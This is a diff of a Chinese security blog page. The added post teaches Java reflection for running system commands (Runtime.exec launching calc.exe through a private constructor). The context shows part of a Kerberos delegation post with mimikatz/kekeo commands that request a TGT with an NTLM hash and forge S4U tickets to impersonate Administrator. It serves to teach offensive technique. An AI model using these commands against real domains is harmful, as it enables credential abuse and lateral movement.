+<p>因为这里调用函数<code>newInstance</code>是一个可变长度参数，我们传递给<code>ProcessBuilder</code>的也是一个可变长度参数，二者叠加就是一个二维数组。</p>
+<p>第一个问题：<code>如果一个类没有无参构造方法</code>，也没有单例模式的静态方法。解决了那么第二个问题<code>如果一个方法或者构造函数是私有方法，如何获取它</code>其实上一节已经说了通过<code>getDeclaredMethod()</code>方法来获取所有方法的方法。同理<code>getDeclaredConstructor</code>可以用来获取所有的构造函数。</p>
+<p>上一节说了使用<code>java.lang.Runtime</code>类要先通过<code>getRuntime</code>方法来获取<code>java.lang.Runtime</code>的类对象，然后再使用<code>exec</code>调用<code>invoke</code>方法去执行命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method getRuntime = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Method exec = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        Object rt = getRuntime.invoke(clazz);</span><br><span class="line">        exec.invoke(rt,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我们可以直接使用<code>getDeclaredConstructor</code>来获取这个私有的构造方法来实例话化对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructor.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里使用了一个<code>setAccessible</code>方法。在Java中可以通过反射进行获取实体类中的字段值，当未设置Field的setAccessible方法为true时，会在调用的时候进行访问安全检查，会抛出IllegalAccessException异常。也就是说当我们获取到一个私有的方法的时候，必须使用<code>setAccessible</code>来修改作用域。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1006,7 +1490,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/4377d7c2fc545597.png"></p>
-<p>得到<a href="mailto:&#x54;&#71;&#84;&#x5f;&#80;&#x43;&#45;&#74;&#65;&#x43;&#75;&#45;&#x30;&#68;&#65;&#x59;&#x40;&#48;&#x44;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x5f;&#x6b;&#114;&#98;&#x74;&#x67;&#116;">&#x54;&#71;&#84;&#x5f;&#80;&#x43;&#45;&#74;&#65;&#x43;&#75;&#45;&#x30;&#68;&#65;&#x59;&#x40;&#48;&#x44;&#65;&#x59;&#x2e;&#x4f;&#82;&#x47;&#x5f;&#x6b;&#114;&#98;&#x74;&#x67;&#116;</a>~<a href="mailto:&#48;&#100;&#x61;&#121;&#46;&#111;&#114;&#x67;&#64;&#48;&#68;&#65;&#89;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#114;&#x62;&#x69;">&#48;&#100;&#x61;&#121;&#46;&#111;&#114;&#x67;&#64;&#48;&#68;&#65;&#89;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#114;&#x62;&#x69;</a></p>
+<p>得到<a href="mailto:&#84;&#x47;&#x54;&#95;&#80;&#x43;&#x2d;&#x4a;&#65;&#x43;&#x4b;&#45;&#48;&#68;&#x41;&#x59;&#64;&#48;&#x44;&#x41;&#89;&#x2e;&#79;&#82;&#71;&#x5f;&#107;&#x72;&#98;&#116;&#103;&#x74;">&#84;&#x47;&#x54;&#95;&#80;&#x43;&#x2d;&#x4a;&#65;&#x43;&#x4b;&#45;&#48;&#68;&#x41;&#x59;&#64;&#48;&#x44;&#x41;&#89;&#x2e;&#79;&#82;&#71;&#x5f;&#107;&#x72;&#98;&#116;&#103;&#x74;</a>~<a href="mailto:&#48;&#100;&#97;&#x79;&#x2e;&#111;&#x72;&#103;&#x40;&#48;&#x44;&#65;&#x59;&#x2e;&#x4f;&#x52;&#x47;&#46;&#107;&#105;&#x72;&#x62;&#x69;">&#48;&#100;&#97;&#x79;&#x2e;&#111;&#x72;&#103;&#x40;&#48;&#x44;&#65;&#x59;&#x2e;&#x4f;&#x52;&#x47;&#46;&#107;&#105;&#x72;&#x62;&#x69;</a></p>
 <h3 id="3-获取ST"><a href="#3-获取ST" class="headerlink" title="3.获取ST"></a>3.获取ST</h3><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>OWA2010SP3 CIFS</code>的ST</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
 
@@ -1108,7 +1592,7 @@
 
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/b7b9d716c74d6bda.png"></p>
-<p>可以看到生成了<a href="mailto:&#x54;&#71;&#84;&#95;&#x6a;&#97;&#99;&#107;&#x40;&#x30;&#x64;&#97;&#x79;&#x2e;&#x6f;&#114;&#103;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#x65;">&#x54;&#71;&#84;&#95;&#x6a;&#97;&#99;&#107;&#x40;&#x30;&#x64;&#97;&#x79;&#x2e;&#x6f;&#114;&#103;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#x65;</a></p>
+<p>可以看到生成了<a href="mailto:&#84;&#x47;&#84;&#x5f;&#x6a;&#97;&#x63;&#x6b;&#64;&#x30;&#x64;&#97;&#x79;&#x2e;&#x6f;&#114;&#x67;&#46;&#99;&#x63;&#97;&#99;&#x68;&#x65;">&#84;&#x47;&#84;&#x5f;&#x6a;&#97;&#x63;&#x6b;&#64;&#x30;&#x64;&#97;&#x79;&#x2e;&#x6f;&#114;&#x67;&#46;&#99;&#x63;&#97;&#99;&#x68;&#x65;</a></p>
 <p><strong>2.mimikatz导入票据</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
 
@@ -1534,7 +2018,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
